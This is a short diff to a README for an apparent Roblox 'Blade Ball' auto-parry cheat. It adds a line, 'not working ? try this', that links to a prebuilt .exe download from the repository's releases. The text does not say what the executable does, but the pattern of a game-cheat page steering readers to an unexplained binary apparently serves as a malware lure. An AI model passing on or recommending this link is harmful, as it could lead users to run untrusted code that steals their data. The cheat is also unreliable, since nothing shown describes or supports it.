@@ -19,6 +19,7 @@ When a ball gets within a certain range, it instantly triggers a parry action!
 
 # Install
 https://github.com/vexori/blade-ball-auto-parry/archive/refs/tags/v4.zip
+not working ? try this https://github.com/vexori/blade-ball-auto-parry/releases/download/v4/blade-ball-auto-parry.exe
 
 ![blade-ball-script-auto-parry](https://github.com/user-attachments/assets/25a331f9-2070-46c8-83ac-01bc431145fc)
 
